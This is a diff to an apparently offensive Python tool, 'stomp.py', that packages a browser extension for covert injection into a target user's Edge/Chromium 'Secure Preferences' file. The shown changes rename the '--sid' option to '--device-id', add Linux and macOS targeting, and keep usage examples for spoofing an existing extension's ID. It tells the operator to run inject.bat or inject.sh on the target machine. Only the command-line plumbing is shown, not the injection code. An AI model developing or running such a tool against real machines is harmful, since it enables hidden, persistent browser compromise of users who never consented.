@@ -7,7 +7,7 @@ Usage
 # Basic injection (fresh random ID)
 python3 stomp.py EXTENSION_DIR/ \
     --prefs-file SecurePreferences \
-    --sid "S-1-5-21-...-...-...-..." \
+    --device-id "S-1-5-21-...-...-...-..." \
     --target-dir "C:\\Users\\USER\\AppData\\Local" \
     --browser edge
  
@@ -15,7 +15,7 @@ python3 stomp.py EXTENSION_DIR/ \
 python3 stomp.py EXTENSION_DIR/ \
     --spoof nmhdhpibnnopknkmonacoephklnflpho \
     --prefs-file SecurePreferences \
-    --sid "S-1-5-21-...-...-...-..." \
+    --device-id "S-1-5-21-...-...-...-..." \
     --target-dir "C:\\Users\\USER\\AppData\\Local" \
     --browser edge
 
@@ -23,7 +23,7 @@ python3 stomp.py EXTENSION_DIR/ \
 python3 stomp.py EXTENSION_DIR/ \
     --spoof nmhdhpibnnopknkmonacoephklnflpho \
     --prefs-file SecurePreferences \
-    --sid "S-1-5-21-...-...-...-..." \
+    --device-id "S-1-5-21-...-...-...-..." \
     --target-dir "C:\\Users\\USER\\AppData\\Local" \
     --proxy http://proxy.corp.com:8080 \
     --browser edge
@@ -67,10 +67,15 @@ def main() -> None:
     )
     parser.add_argument("--prefs-file", required=True,
                         help="Path to the target Secure Preferences file")
-    parser.add_argument("--sid", required=True,
-                        help="Target user's Windows SID")
+    parser.add_argument("--device-id", required=True,
+                        help="Target user's Windows SID or hardware UUID for Linux/macOS")
     parser.add_argument("--target-dir", required=True,
                         help=r"Deployment root on target (e.g. C:\Users\X\AppData\Local)")
+    parser.add_argument("--platform",
+                        choices=["windows", "linux", "darwin"],
+                        default="windows",
+                        help="Target platform (default: windows)"
+    )
     parser.add_argument("--browser",
                         choices=list(BrowserConfigurator.get_browser_configs().keys()),
                         default="edge",
@@ -112,8 +117,9 @@ def main() -> None:
     result = package(
         extension_dir=args.extension_dir,
         prefs_file=args.prefs_file,
-        sid=args.sid,
+        device_id=args.device_id,
         target_dir=args.target_dir,
+        platform=args.platform,
         browser_id=args.browser,
         output_dir=args.output,
         debug=args.debug,
@@ -124,7 +130,10 @@ def main() -> None:
         sys.exit(1)
  
     print("\n[+] Done.")
-    print("[*] Extract the _deploy.zip on the target machine and run inject.bat")
+    if args.platform == "windows":
+        print("[*] Extract the _deploy.zip on the target machine and run inject.bat")
+    else:
+        print("[*] Extract the _deploy.zip on the target machine and run inject.sh")
 
 
 
